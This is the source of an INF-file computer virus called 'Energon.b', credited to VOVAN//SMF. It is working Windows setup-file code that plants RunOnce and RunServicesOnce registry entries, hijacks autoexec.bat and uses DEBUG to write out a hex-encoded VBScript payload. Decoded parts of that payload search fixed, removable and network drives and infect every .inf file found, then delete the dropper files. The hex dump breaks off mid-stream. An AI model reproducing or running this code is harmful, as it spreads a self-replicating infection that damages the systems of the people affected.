;======================================================================================================================================================
; VOVAN//SMF - Energon.b INF virus.
; Made in Russia
;======================================================================================================================================================

[version]
signature="$CHICAGO$"
SetupClass=BASE
[SourceDisksNames]
1="VOVAN//SMF","",1
[DestinationDirs]
Host_Energon.File  = 10
Copy_Auto_Bak.Ren  = 30
Rename_bat_vbs.Ren = 30
Ren_bak_bat.Ren    = 30
[DefaultInstall]
CopyFiles = Host_Energon.File
AddReg = Inst_Run
[Inst_Run]
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Install_Energon 64 %10%\energon.inf"
[Install_Energon]
UpdateInis = Energon_dump
RenFiles  = Copy_Auto_Bak.Ren
UpdateAutoBat = Energon_Attach
AddReg = Run_Ren_Auto_Bat.reg
[Copy_Auto_Bak.Ren]
autoexec.bak,autoexec.bat
[Run_Ren_Auto_Bat.reg]
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_Auto_Bat 64 %10%\energon.inf"
[Ren_Auto_Bat]
RenFiles = Rename_bat_vbs.Ren
AddReg = Rename_bak_bat.reg
[Rename_bat_vbs.Ren]
tmp.vbs,autoexec.bat
[Rename_bak_bat.reg]
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_bak_bat_run 64 %10%\energon.inf"
[Ren_bak_bat_run]
RenFiles = Ren_bak_bat.Ren
AddReg = Run_tmp.reg
[Ren_bak_bat.Ren]
autoexec.bat,autoexec.bak
[Run_tmp.reg]
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"%10%\wscript.exe %30%\tmp.vbs //B"
[Host_Energon.File]
Energon.inf, Energon.inf
[Energon_Attach]
CmdAdd="On","Error Resume Next"
CmdAdd="Set","A=CreateObject(""Scripting.FileSystemObject"")"
CmdAdd="Set","B=CreateObject(""WScript.Shell"")"
CmdAdd="B.Run",""(""Command.com /c Debug < %10%\enr.drv""),0"
CmdAdd="Do"
CmdAdd="If","A.FileExists(A.GetSpecialFolder(0)&""\energon.vbs"")<>False Then Exit Do"
CmdAdd="Loop"
CmdAdd="B.Run","(""%10%\wscript.exe %10%\energon.vbs""),0"
CmdAdd="A.DeleteFile","(""%10%\enr.drv""),1"
CmdAdd="A.DeleteFile","(""%30%\tmp.vbs""),1"
[Energon_dump]
%10%\enr.drv,-,,"N %10%\ENERGON.VBS"
%10%\enr.drv,-,,"E 0100 27 56 4F 56 41 4E 2F 2F 53 4D 46 20 2D 20 45 6E"
%10%\enr.drv,-,,"E 0110 65 72 67 6F 6E 2E 62 20 49 4E 46 20 76 69 72 75"
%10%\enr.drv,-,,"E 0120 73 2E 0D 0A 4F 6E 20 45 72 72 6F 72 20 52 65 73"
%10%\enr.drv,-,,"E 0130 75 6D 65 20 4E 65 78 74 0D 0A 53 65 74 20 54 3D"
%10%\enr.drv,-,,"E 0140 43 72 65 61 74 65 4F 62 6A 65 63 74 28 22 53 63"
%10%\enr.drv,-,,"E 0150 72 69 70 74 69 6E 67 2E 46 69 6C 65 53 79 73 74"
%10%\enr.drv,-,,"E 0160 65 6D 4F 62 6A 65 63 74 22 29 3A 56 3D 43 68 72"
%10%\enr.drv,-,,"E 0170 28 31 33 29 26 43 68 72 28 31 30 29 3A 48 4B 3D"
%10%\enr.drv,-,,"E 0180 22 48 4B 4C 4D 2C 53 4F 46 54 57 41 52 45 5C 4D"
%10%\enr.drv,-,,"E 0190 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73"
%10%\enr.drv,-,,"E 01A0 5C 43 75 72 72 65 6E 74 56 65 72 73 69 6F 6E 5C"
%10%\enr.drv,-,,"E 01B0 52 75 6E 22 3A 4D 30 3D 22 5B 56 65 72 73 69 6F"
%10%\enr.drv,-,,"E 01C0 6E 5D 22 3A 4D 31 3D 22 5B 44 65 73 74 69 6E 61"
%10%\enr.drv,-,,"E 01D0 74 69 6F 6E 44 69 72 73 5D 22 3A 4D 32 3D 22 5B"
%10%\enr.drv,-,,"E 01E0 44 65 66 61 75 6C 74 49 6E 73 74 61 6C 6C 5D 22"
%10%\enr.drv,-,,"E 01F0 3A 4D 33 3D 22 45 6E 65 72 67 6F 6E 22 3A 42 30"
%10%\enr.drv,-,,"E 0200 3D 22 5B 22 3A 42 31 3D 22 5D 22 2B 56 3A 4D 34"
%10%\enr.drv,-,,"E 0210 3D 42 30 2B 4D 33 2B 22 5F 64 75 6D 70 5D 22 3A"
%10%\enr.drv,-,,"E 0220 4D 35 3D 22 43 6F 70 79 46 69 6C 65 73 22 3A 4D"
%10%\enr.drv,-,,"E 0230 36 3D 22 41 64 64 52 65 67 22 3A 4D 37 3D 22 48"
%10%\enr.drv,-,,"E 0240 6F 73 74 5F 22 2B 4D 33 2B 22 2E 46 69 6C 65 22"
%10%\enr.drv,-,,"E 0250 3A 4D 38 3D 22 49 6E 73 74 5F 52 75 6E 22 3A 4D"
%10%\enr.drv,-,,"E 0260 39 3D 22 52 65 6E 46 69 6C 65 73 20 3D 20 22 3A"
%10%\enr.drv,-,,"E 0270 42 32 3D 22 5C 22 2B 4D 33 2B 22 2E 69 6E 66 22"
%10%\enr.drv,-,,"E 0280 3A 5A 31 3D 43 68 72 28 33 34 29 3A 42 33 3D 22"
%10%\enr.drv,-,,"E 0290 43 6D 64 41 64 64 3D 22 2B 5A 31 3A 42 34 3D 22"
%10%\enr.drv,-,,"E 02A0 43 6F 70 79 5F 41 75 74 6F 5F 42 61 6B 2E 52 65"
%10%\enr.drv,-,,"E 02B0 6E 22 3A 42 35 3D 22 52 65 6E 61 6D 65 5F 62 61"
%10%\enr.drv,-,,"E 02C0 74 5F 76 62 73 2E 52 65 6E 22 3A 42 36 3D 22 52"
%10%\enr.drv,-,,"E 02D0 65 6E 5F 62 61 6B 5F 62 61 74 2E 52 65 6E 22 3A"
%10%\enr.drv,-,,"E 02E0 42 37 3D 22 52 65 6E 5F 41 75 74 6F 5F 42 61 74"
%10%\enr.drv,-,,"E 02F0 22 3A 42 38 3D 22 52 75 6E 5F 22 2B 42 37 2B 22"
%10%\enr.drv,-,,"E 0300 2E 72 65 67 22 3A 42 39 3D 22 52 65 6E 61 6D 65"
%10%\enr.drv,-,,"E 0310 5F 62 61 6B 5F 62 61 74 2E 72 65 67 22 3A 43 30"
%10%\enr.drv,-,,"E 0320 3D 22 4F 6E 63 65 2C 52 75 6E 2C 2C 22 2B 5A 31"
%10%\enr.drv,-,,"E 0330 2B 22 52 55 4E 44 4C 4C 2E 45 58 45 20 25 31 31"
%10%\enr.drv,-,,"E 0340 25 5C 73 65 74 75 70 78 2E 64 6C 6C 2C 49 6E 73"
%10%\enr.drv,-,,"E 0350 74 61 6C 6C 48 69 6E 66 53 65 63 74 69 6F 6E 20"
%10%\enr.drv,-,,"E 0360 22 3A 43 31 3D 22 20 36 34 20 25 31 30 25 22 2B"
%10%\enr.drv,-,,"E 0370 42 32 2B 5A 31 2B 56 3A 43 32 3D 22 52 65 6E 5F"
%10%\enr.drv,-,,"E 0380 62 61 6B 5F 62 61 74 5F 72 75 6E 22 3A 43 33 3D"
%10%\enr.drv,-,,"E 0390 22 49 6E 73 74 61 6C 6C 5F 22 2B 4D 33 3A 43 34"
%10%\enr.drv,-,,"E 03A0 3D 4D 33 2B 22 5F 41 74 74 61 63 68 22 3A 43 35"
%10%\enr.drv,-,,"E 03B0 3D 22 61 75 74 6F 65 78 65 63 22 3A 43 36 3D 43"
%10%\enr.drv,-,,"E 03C0 35 2B 22 2E 62 61 74 22 3A 43 37 3D 43 35 2B 22"
%10%\enr.drv,-,,"E 03D0 2E 62 61 6B 22 3A 53 65 74 20 49 3D 54 2E 47 65"
%10%\enr.drv,-,,"E 03E0 74 53 70 65 63 69 61 6C 46 6F 6C 64 65 72 28 30"
%10%\enr.drv,-,,"E 03F0 29 3A 4E 3D 49 2B 42 32 3A 43 61 6C 6C 20 54 65"
%10%\enr.drv,-,,"E 0400 73 74 5F 49 4E 46 28 4E 2C 31 2C 58 29 0D 0A 49"
%10%\enr.drv,-,,"E 0410 66 20 58 3D 22 22 20 54 68 65 6E 20 57 53 63 72"
%10%\enr.drv,-,,"E 0420 69 70 74 2E 51 75 69 74 0D 0A 45 3D 58 3A 53 65"
%10%\enr.drv,-,,"E 0430 74 20 4B 4B 3D 54 2E 44 72 69 76 65 73 0D 0A 46"
%10%\enr.drv,-,,"E 0440 6F 72 20 45 61 63 68 20 44 72 69 76 65 20 49 6E"
%10%\enr.drv,-,,"E 0450 20 4B 4B 0D 0A 49 66 20 44 72 69 76 65 2E 44 72"
%10%\enr.drv,-,,"E 0460 69 76 65 54 79 70 65 3D 31 20 4F 72 20 44 72 69"
%10%\enr.drv,-,,"E 0470 76 65 2E 44 72 69 76 65 54 79 70 65 3D 32 20 4F"
%10%\enr.drv,-,,"E 0480 72 20 44 72 69 76 65 2E 44 72 69 76 65 54 79 70"
%10%\enr.drv,-,,"E 0490 65 3D 33 20 54 68 65 6E 20 53 65 61 72 63 68 20"
%10%\enr.drv,-,,"E 04A0 44 72 69 76 65 2E 50 61 74 68 20 26 22 5C 22 0D"
%10%\enr.drv,-,,"E 04B0 0A 4E 65 78 74 0D 0A 54 2E 44 65 6C 65 74 65 46"
%10%\enr.drv,-,,"E 04C0 69 6C 65 28 4E 29 2C 31 3A 54 2E 44 65 6C 65 74"
%10%\enr.drv,-,,"E 04D0 65 46 69 6C 65 28 57 73 63 72 69 70 74 2E 53 63"
%10%\enr.drv,-,,"E 04E0 72 69 70 74 46 75 6C 6C 4E 61 6D 65 29 2C 31 0D"
%10%\enr.drv,-,,"E 04F0 0A 53 75 62 20 49 6E 66 65 63 74 65 64 28 55 29"
%10%\enr.drv,-,,"E 0500 0D 0A 57 3D 54 2E 47 65 74 46 69 6C 65 4E 61 6D"
%10%\enr.drv,-,,"E 0510 65 28 55 29 3A 53 65 74 20 56 56 3D 54 2E 4F 70"
%10%\enr.drv,-,,"E 0520 65 6E 54 65 78 74 46 69 6C 65 28 55 2C 31 29 3A"
%10%\enr.drv,-,,"E 0530 41 30 3D 56 56 2E 52 65 61 64 41 6C 6C 3A 56 56"
%10%\enr.drv,-,,"E 0540 2E 43 6C 6F 73 65 3A 4D 3D 53 70 6C 69 74 28 41"
%10%\enr.drv,-,,"E 0550 30 2C 56 29 0D 0A 46 6F 72 20 5A 3D 30 20 54 6F"
%10%\enr.drv,-,,"E 0560 20 55 42 6F 75 6E 64 28 4D 29 20 53 74 65 70 20"
%10%\enr.drv,-,,"E 0570 31 0D 0A 41 3D 4D 28 5A 29 2B 56 0D 0A 49 66 20"
%10%\enr.drv,-,,"E 0580 4D 54 3C 3E 54 72 75 65 20 54 68 65 6E 20 49 66"
%10%\enr.drv,-,,"E 0590 20 49 6E 53 74 72 28 4C 54 72 69 6D 28 41 29 2C"
%10%\enr.drv,-,,"E 05A0 22 65 73 74 69 6E 61 74 69 6F 6E 22 29 3D 33 20"
%10%\enr.drv,-,,"E 05B0 54 68 65 6E 20 41 3D 4D 69 64 28 41 2C 31 2C 4C"
%10%\enr.drv,-,,"E 05C0 65 6E 28 41 29 29 3A 41 3D 41 2B 4D 37 2B 22 20"
%10%\enr.drv,-,,"E 05D0 20 3D 20 31 30 22 2B 56 3A 41 3D 41 2B 42 34 2B"
%10%\enr.drv,-,,"E 05E0 22 20 20 3D 20 33 30 22 2B 56 3A 41 3D 41 2B 42"
%10%\enr.drv,-,,"E 05F0 35 2B 22 20 3D 20 33 30 22 2B 56 3A 41 3D 41 2B"
%10%\enr.drv,-,,"E 0600 42 36 2B 22 20 20 20 20 3D 20 33 30 22 2B 56 3A"
%10%\enr.drv,-,,"E 0610 4D 54 3D 54 72 75 65 0D 0A 49 66 20 4D 55 3C 3E"
%10%\enr.drv,-,,"E 0620 54 72 75 65 20 54 68 65 6E 20 49 66 20 49 6E 53"
%10%\enr.drv,-,,"E 0630 74 72 28 4C 54 72 69 6D 28 41 29 2C 4D 32 29 3D"
%10%\enr.drv,-,,"E 0640 31 20 54 68 65 6E 20 41 3D 4D 69 64 28 41 2C 31"
%10%\enr.drv,-,,"E 0650 2C 4C 65 6E 28 41 29 29 3A 41 3D 41 2B 4D 35 2B"
%10%\enr.drv,-,,"E 0660 22 20 3D 20 22 2B 4D 37 2B 56 3A 41 3D 41 2B 4D"
%10%\enr.drv,-,,"E 0670 36 2B 22 20 3D 20 22 2B 4D 38 2B 56 3A 4D 55 3D"
%10%\enr.drv,-,,"E 0680 54 72 75 65 0D 0A 49 66 20 49 6E 53 74 72 28 4C"
%10%\enr.drv,-,,"E 0690 54 72 69 6D 28 41 29 2C 22 6F 70 79 22 29 3D 32"
%10%\enr.drv,-,,"E 06A0 20 54 68 65 6E 20 49 66 20 46 69 6E 64 28 4D 35"
%10%\enr.drv,-,,"E 06B0 2C 41 29 3D 31 20 54 68 65 6E 20 49 66 20 49 6E"
%10%\enr.drv,-,,"E 06C0 53 74 72 28 41 2C 4D 37 29 3D 30 20 54 68 65 6E"
%10%\enr.drv,-,,"E 06D0 20 41 3D 4D 69 64 28 41 2C 31 2C 4C 65 6E 28 41"
%10%\enr.drv,-,,"E 06E0 29 2D 32 29 2B 22 2C 22 2B 4D 37 2B 56 3A 43 46"
%10%\enr.drv,-,,"E 06F0 3D 54 72 75 65 20 45 6C 73 65 20 43 46 3D 54 72"
%10%\enr.drv,-,,"E 0700 75 65 0D 0A 49 66 20 49 6E 53 74 72 28 4C 54 72"
%10%\enr.drv,-,,"E 0710 69 6D 28 41 29 2C 22 64 64 22 29 3D 32 20 54 68"
%10%\enr.drv,-,,"E 0720 65 6E 20 49 66 20 46 69 6E 64 28 4D 36 2C 41 29"
%10%\enr.drv,-,,"E 0730 3D 31 20 54 68 65 6E 20 49 66 20 49 6E 53 74 72"
%10%\enr.drv,-,,"E 0740 28 41 2C 4D 38 29 3D 30 20 54 68 65 6E 20 41 3D"
%10%\enr.drv,-,,"E 0750 4D 69 64 28 41 2C 31 2C 4C 65 6E 28 41 29 2D 32"
%10%\enr.drv,-,,"E 0760 29 2B 22 2C 22 2B 4D 38 2B 56 3A 41 44 3D 54 72"
%10%\enr.drv,-,,"E 0770 75 65 20 45 6C 73 65 20 41 44 3D 54 72 75 65 0D"
%10%\enr.drv,-,,"E 0780 0A 49 66 20 49 6E 53 74 72 28 4C 54 72 69 6D 28"
%10%\enr.drv,-,,"E 0790 41 29 2C 42 30 29 3D 31 20 41 6E 64 20 49 6E 53"
%10%\enr.drv,-,,"E 07A0 74 72 28 41 2C 22 5D 22 29 3C 3E 30 20 54 68 65"
%10%\enr.drv,-,,"E 07B0 6E 0D 0A 49 66 20 43 46 3D 46 61 6C 73 65 20 41"
%10%\enr.drv,-,,"E 07C0 6E 64 20 41 44 3D 54 72 75 65 20 54 68 65 6E 20"
%10%\enr.drv,-,,"E 07D0 50 50 3D 4D 69 64 28 41 2C 31 2C 4C 65 6E 28 41"
%10%\enr.drv,-,,"E 07E0 29 29 3A 41 3D 4D 35 2B 22 20 3D 20 22 2B 4D 37"
%10%\enr.drv,-,,"E 07F0 2B 56 3A 41 3D 41 2B 50 50 0D 0A 49 66 20 41 44"
%10%\enr.drv,-,,"E 0800 3D 46 61 6C 73 65 20 41 6E 64 20 43 46 3D 54 72"
%10%\enr.drv,-,,"E 0810 75 65 20 54 68 65 6E 20 50 50 3D 4D 69 64 28 41"
%10%\enr.drv,-,,"E 0820 2C 31 2C 4C 65 6E 28 41 29 29 3A 41 3D 4D 36 2B"
%10%\enr.drv,-,,"E 0830 22 20 3D 20 22 2B 4D 38 2B 56 3A 41 3D 41 2B 50"
%10%\enr.drv,-,,"E 0840 50 0D 0A 43 46 3D 46 61 6C 73 65 3A 41 44 3D 46"
%10%\enr.drv,-,,"E 0850 61 6C 73 65 0D 0A 45 6E 64 20 49 66 0D 0A 44 3D"
%10%\enr.drv,-,,"E 0860 44 2B 41 0D 0A 4E 65 78 74 0D 0A 49 66 20 4D 54"
%10%\enr.drv,-,,"E 0870 3C 3E 54 72 75 65 20 54 68 65 6E 20 44 3D 44 2B"
%10%\enr.drv,-,,"E 0880 4D 31 2B 56 3A 44 3D 44 2B 4D 37 2B 22 20 20 3D"
%10%\enr.drv,-,,"E 0890 20 31 30 22 2B 56 3A 44 3D 44 2B 42 34 2B 22 20"
%10%\enr.drv,-,,"E 08A0 20 3D 20 33 30 22 2B 56 3A 44 3D 44 2B 42 35 2B"
%10%\enr.drv,-,,"E 08B0 22 20 3D 20 33 30 22 2B 56 3A 44 3D 44 2B 42 36"
%10%\enr.drv,-,,"E 08C0 2B 22 20 20 20 20 3D 20 33 30 22 2B 56 0D 0A 49"
%10%\enr.drv,-,,"E 08D0 66 20 4D 55 3C 3E 54 72 75 65 20 54 68 65 6E 20"
%10%\enr.drv,-,,"E 08E0 44 3D 44 2B 4D 32 2B 56 3A 44 3D 44 2B 4D 35 2B"
%10%\enr.drv,-,,"E 08F0 22 20 3D 20 22 2B 4D 37 2B 56 3A 44 3D 44 2B 4D"
%10%\enr.drv,-,,"E 0900 36 2B 22 20 3D 20 22 2B 4D 38 2B 56 0D 0A 44 3D"
%10%\enr.drv,-,,"E 0910 44 2B 42 30 2B 4D 38 2B 42 31 3A 44 3D 44 2B 48"
%10%\enr.drv,-,,"E 0920 4B 2B 22 53 65 72 76 69 63 65 73 22 2B 43 30 2B"
%10%\enr.drv,-,,"E 0930 43 33 2B 43 31 3A 44 3D 44 2B 42 30 2B 43 33 2B"
%10%\enr.drv,-,,"E 0940 42 31 3A 44 3D 44 2B 22 55 70 64 61 74 65 49 6E"
%10%\enr.drv,-,,"E 0950 69 73 20 3D 20 22 2B 4D 33 2B 22 5F 64 75 6D 70"
%10%\enr.drv,-,,"E 0960 22 2B 56 3A 44 3D 44 2B 4D 39 2B 42 34 2B 56 3A"
%10%\enr.drv,-,,"E 0970 44 3D 44 2B 22 55 70 64 61 74 65 41 75 74 6F 42"
%10%\enr.drv,-,,"E 0980 61 74 20 3D 20 22 2B 43 34 2B 56 3A 44 3D 44 2B"
%10%\enr.drv,-,,"E 0990 4D 36 2B 22 20 3D 20 22 2B 42 38 2B 56 3A 44 3D"
%10%\enr.drv,-,,"E 09A0 44 2B 42 30 2B 42 34 2B 42 31 3A 44 3D 44 2B 43"
%10%\enr.drv,-,,"E 09B0 37 2B 22 2C 22 2B 43 36 2B 56 3A 44 3D 44 2B 42"
%10%\enr.drv,-,,"E 09C0 30 2B 42 38 2B 42 31 3A 44 3D 44 2B 48 4B 2B 43"
%10%\enr.drv,-,,"E 09D0 30 2B 42 37 2B 43 31 3A 44 3D 44 2B 42 30 2B 42"
%10%\enr.drv,-,,"E 09E0 37 2B 42 31 3A 44 3D 44 2B 4D 39 2B 42 35 2B 56"
%10%\enr.drv,-,,"E 09F0 3A 44 3D 44 2B 4D 36 2B 22 20 3D 20 22 2B 42 39"
%10%\enr.drv,-,,"E 0A00 2B 56 3A 44 3D 44 2B 42 30 2B 42 35 2B 42 31 3A"
%10%\enr.drv,-,,"E 0A10 44 3D 44 2B 22 74 6D 70 2E 76 62 73 2C 22 2B 43"
%10%\enr.drv,-,,"E 0A20 36 2B 56 3A 44 3D 44 2B 42 30 2B 42 39 2B 42 31"
%10%\enr.drv,-,,"E 0A30 3A 44 3D 44 2B 48 4B 2B 43 30 2B 43 32 2B 43 31"
%10%\enr.drv,-,,"E 0A40 3A 44 3D 44 2B 42 30 2B 43 32 2B 42 31 3A 44 3D"
%10%\enr.drv,-,,"E 0A50 44 2B 4D 39 2B 42 36 2B 56 3A 44 3D 44 2B 4D 36"
%10%\enr.drv,-,,"E 0A60 2B 22 20 3D 20 52 75 6E 5F 74 6D 70 2E 72 65 67"
%10%\enr.drv,-,,"E 0A70 22 2B 56 3A 44 3D 44 2B 42 30 2B 42 36 2B 42 31"
%10%\enr.drv,-,,"E 0A80 3A 44 3D 44 2B 43 36 2B 22 2C 22 2B 43 37 2B 56"
%10%\enr.drv,-,,"E 0A90 3A 44 3D 44 2B 22 5B 52 75 6E 5F 74 6D 70 2E 72"
%10%\enr.drv,-,,"E 0AA0 65 67 5D 22 2B 56 3A 44 3D 44 2B 48 4B 2B 22 4F"
%10%\enr.drv,-,,"E 0AB0 6E 63 65 2C 52 75 6E 2C 2C 22 22 25 31 30 25 5C"
%10%\enr.drv,-,,"E 0AC0 77 73 63 72 69 70 74 2E 65 78 65 20 25 33 30 25"
%10%\enr.drv,-,,"E 0AD0 5C 74 6D 70 2E 76 62 73 20 2F 2F 42 22 22 22 2B"
%10%\enr.drv,-,,"E 0AE0 56 3A 44 3D 44 2B 42 30 2B 4D 37 2B 42 31 3A 44"
%10%\enr.drv,-,,"E 0AF0 3D 44 2B 4D 33 2B 22 2E 69 6E 66 2C 22 2B 57 2B"
%10%\enr.drv,-,,"E 0B00 56 3A 44 3D 44 2B 42 30 2B 43 34 2B 42 31 3A 44"
%10%\enr.drv,-,,"E 0B10 3D 44 2B 42 33 2B 22 4F 6E 22 22 2C 22 22 45 72"
%10%\enr.drv,-,,"E 0B20 72 6F 72 20 52 65 73 75 6D 65 20 4E 65 78 74 22"
%10%\enr.drv,-,,"E 0B30 22 22 2B 56 3A 44 3D 44 2B 42 33 2B 22 53 65 74"
%10%\enr.drv,-,,"E 0B40 22 22 2C 22 22 41 3D 43 72 65 61 74 65 4F 62 6A"
%10%\enr.drv,-,,"E 0B50 65 63 74 28 22 22 22 22 53 63 72 69 70 74 69 6E"
%10%\enr.drv,-,,"E 0B60 67 2E 46 69 6C 65 53 79 73 74 65 6D 4F 62 6A 65"
%10%\enr.drv,-,,"E 0B70 63 74 22 22 22 22 29 22 22 22 2B 56 3A 22 53 65"
%10%\enr.drv,-,,"E 0B80 74 22 22 2C 22 22 42 3D 43 72 65 61 74 65 4F 62"
%10%\enr.drv,-,,"E 0B90 6A 65 63 74 28 22 22 22 22 57 53 63 72 69 70 74"
%10%\enr.drv,-,,"E 0BA0 2E 53 68 65 6C 6C 22 22 22 22 29 22 22 22 2B 56"
%10%\enr.drv,-,,"E 0BB0 3A 44 3D 44 2B 42 33 2B 22 42 2E 52 75 6E 22 22"
%10%\enr.drv,-,,"E 0BC0 2C 22 22 28 22 22 22 22 43 6F 6D 6D 61 6E 64 2E"
%10%\enr.drv,-,,"E 0BD0 63 6F 6D 20 2F 63 20 44 65 62 75 67 20 3C 20 25"
%10%\enr.drv,-,,"E 0BE0 31 30 25 5C 65 6E 72 2E 64 72 76 22 22 22 22 29"
%10%\enr.drv,-,,"E 0BF0 2C 30 22 22 22 2B 56 3A 44 3D 44 2B 42 33 2B 22"
%10%\enr.drv,-,,"E 0C00 44 6F 22 22 22 2B 56 3A 44 3D 44 2B 42 33 2B 22"
%10%\enr.drv,-,,"E 0C10 49 66 22 22 2C 22 22 41 2E 46 69 6C 65 45 78 69"
%10%\enr.drv,-,,"E 0C20 73 74 73 28 41 2E 47 65 74 53 70 65 63 69 61 6C"
%10%\enr.drv,-,,"E 0C30 46 6F 6C 64 65 72 28 30 29 26 22 22 22 22 5C 65"
%10%\enr.drv,-,,"E 0C40 6E 65 72 67 6F 6E 2E 76 62 73 22 22 22 22 29 3C"
%10%\enr.drv,-,,"E 0C50 3E 46 61 6C 73 65 20 54 68 65 6E 20 45 78 69 74"
%10%\enr.drv,-,,"E 0C60 20 44 6F 22 22 22 2B 56 3A 44 3D 44 2B 42 33 2B"
%10%\enr.drv,-,,"E 0C70 22 4C 6F 6F 70 22 22 22 2B 56 3A 44 3D 44 2B 42"
%10%\enr.drv,-,,"E 0C80 33 2B 22 42 2E 52 75 6E 22 22 2C 22 22 28 22 22"
%10%\enr.drv,-,,"E 0C90 22 22 25 31 30 25 5C 77 73 63 72 69 70 74 2E 65"
%10%\enr.drv,-,,"E 0CA0 78 65 20 25 31 30 25 5C 65 6E 65 72 67 6F 6E 2E"
%10%\enr.drv,-,,"E 0CB0 76 62 73 22 22 22 22 29 2C 30 22 22 22 2B 56 3A"
%10%\enr.drv,-,,"E 0CC0 44 3D 44 2B 42 33 2B 22 41 2E 44 65 6C 65 74 65"
%10%\enr.drv,-,,"E 0CD0 46 69 6C 65 22 22 2C 22 22 28 22 22 22 22 25 31"
%10%\enr.drv,-,,"E 0CE0 30 25 5C 65 6E 72 2E 64 72 76 22 22 22 22 29 2C"
%10%\enr.drv,-,,"E 0CF0 31 22 22 22 2B 56 0D 0A 44 3D 44 2B 42 33 2B 22"
%10%\enr.drv,-,,"E 0D00 41 2E 44 65 6C 65 74 65 46 69 6C 65 22 22 2C 22"
%10%\enr.drv,-,,"E 0D10 22 28 57 73 63 72 69 70 74 2E 53 63 72 69 70 74"
%10%\enr.drv,-,,"E 0D20 46 75 6C 6C 4E 61 6D 65 29 2C 31 22 22 22 2B 56"
%10%\enr.drv,-,,"E 0D30 3A 44 3D 44 2B 45 2B 56 3A 53 65 74 20 46 3D 54"
%10%\enr.drv,-,,"E 0D40 2E 4F 70 65 6E 54 65 78 74 46 69 6C 65 28 55 2C"
%10%\enr.drv,-,,"E 0D50 32 29 3A 46 2E 57 72 69 74 65 20 44 3A 46 2E 43"
%10%\enr.drv,-,,"E 0D60 6C 6F 73 65 0D 0A 45 6E 64 20 53 75 62 0D 0A 46"
%10%\enr.drv,-,,"E 0D70 75 6E 63 74 69 6F 6E 20 53 65 61 72 63 68 28 48"
%10%\enr.drv,-,,"E 0D80 29 0D 0A 53 65 74 20 4A 3D 54 2E 47 65 74 46 6F"
%10%\enr.drv,-,,"E 0D90 6C 64 65 72 28 48 29 3A 53 65 74 20 43 3D 4A 2E"
%10%\enr.drv,-,,"E 0DA0 53 75 62 46 6F 6C 64 65 72 73 0D 0A 46 6F 72 20"
%10%\enr.drv,-,,"E 0DB0 45 61 63 68 20 5A 59 20 49 6E 20 43 0D 0A 53 65"
%10%\enr.drv,-,,"E 0DC0 61 72 63 68 28 5A 59 29 0D 0A 4E 65 78 74 0D 0A"
%10%\enr.drv,-,,"E 0DD0 53 65 74 20 43 38 3D 4A 2E 46 69 6C 65 73 0D 0A"
%10%\enr.drv,-,,"E 0DE0 46 6F 72 20 45 61 63 68 20 52 20 49 6E 20 43 38"
%10%\enr.drv,-,,"E 0DF0 0D 0A 53 3D 54 2E 47 65 74 45 78 74 65 6E 73 69"
%10%\enr.drv,-,,"E 0E00 6F 6E 4E 61 6D 65 28 52 2E 50 61 74 68 29 0D 0A"
%10%\enr.drv,-,,"E 0E10 49 66 20 53 3D 22 69 6E 66 22 20 4F 72 20 53 3D"
%10%\enr.drv,-,,"E 0E20 22 49 4E 46 22 20 54 68 65 6E 20 43 61 6C 6C 20"
%10%\enr.drv,-,,"E 0E30 54 65 73 74 5F 49 4E 46 28 52 2E 50 61 74 68 2C"
%10%\enr.drv,-,,"E 0E40 32 2C 30 29 0D 0A 4E 65 78 74 0D 0A 45 6E 64 20"
%10%\enr.drv,-,,"E 0E50 46 75 6E 63 74 69 6F 6E 0D 0A 46 75 6E 63 74 69"
%10%\enr.drv,-,,"E 0E60 6F 6E 20 54 65 73 74 5F 49 4E 46 28 47 2C 51 2C"
%10%\enr.drv,-,,"E 0E70 58 29 0D 0A 58 3D 22 22 0D 0A 49 66 20 54 2E 46"
%10%\enr.drv,-,,"E 0E80 69 6C 65 45 78 69 73 74 73 28 47 29 3D 46 61 6C"
%10%\enr.drv,-,,"E 0E90 73 65 20 54 68 65 6E 20 45 78 69 74 20 46 75 6E"
%10%\enr.drv,-,,"E 0EA0 63 74 69 6F 6E 0D 0A 53 65 74 20 42 3D 54 2E 4F"
%10%\enr.drv,-,,"E 0EB0 70 65 6E 54 65 78 74 46 69 6C 65 28 47 2C 31 29"
%10%\enr.drv,-,,"E 0EC0 3A 4F 3D 42 2E 52 65 61 64 41 6C 6C 3A 42 2E 43"
%10%\enr.drv,-,,"E 0ED0 6C 6F 73 65 3A 4D 3D 53 70 6C 69 74 28 4F 2C 56"
%10%\enr.drv,-,,"E 0EE0 29 0D 0A 46 6F 72 20 5A 3D 30 20 54 6F 20 55 42"
%10%\enr.drv,-,,"E 0EF0 6F 75 6E 64 28 4D 29 20 53 74 65 70 20 31 0D 0A"
%10%\enr.drv,-,,"E 0F00 41 3D 4D 28 5A 29 2B 56 0D 0A 49 66 20 59 5A 3C"
%10%\enr.drv,-,,"E 0F10 3E 54 72 75 65 20 54 68 65 6E 20 49 66 20 49 6E"
%10%\enr.drv,-,,"E 0F20 53 74 72 28 41 2C 4D 30 29 3D 31 20 4F 72 20 49"
%10%\enr.drv,-,,"E 0F30 6E 53 74 72 28 41 2C 4C 43 61 73 65 28 4D 30 29"
%10%\enr.drv,-,,"E 0F40 29 3D 31 20 54 68 65 6E 20 59 5A 3D 54 72 75 65"
%10%\enr.drv,-,,"E 0F50 0D 0A 49 66 20 50 4C 3C 3E 54 72 75 65 20 54 68"
%10%\enr.drv,-,,"E 0F60 65 6E 20 49 66 20 49 6E 53 74 72 28 41 2C 4D 34"
%10%\enr.drv,-,,"E 0F70 29 3D 31 20 54 68 65 6E 20 41 3D 4D 69 64 28 41"
%10%\enr.drv,-,,"E 0F80 2C 31 2C 4C 65 6E 28 41 29 29 3A 50 4C 3D 54 72"
%10%\enr.drv,-,,"E 0F90 75 65 0D 0A 49 66 20 50 4C 3D 54 72 75 65 20 54"
%10%\enr.drv,-,,"E 0FA0 68 65 6E 0D 0A 49 66 20 49 6E 53 74 72 28 41 2C"
%10%\enr.drv,-,,"E 0FB0 22 3B 22 2B 4D 33 29 3D 31 20 54 68 65 6E 20 41"
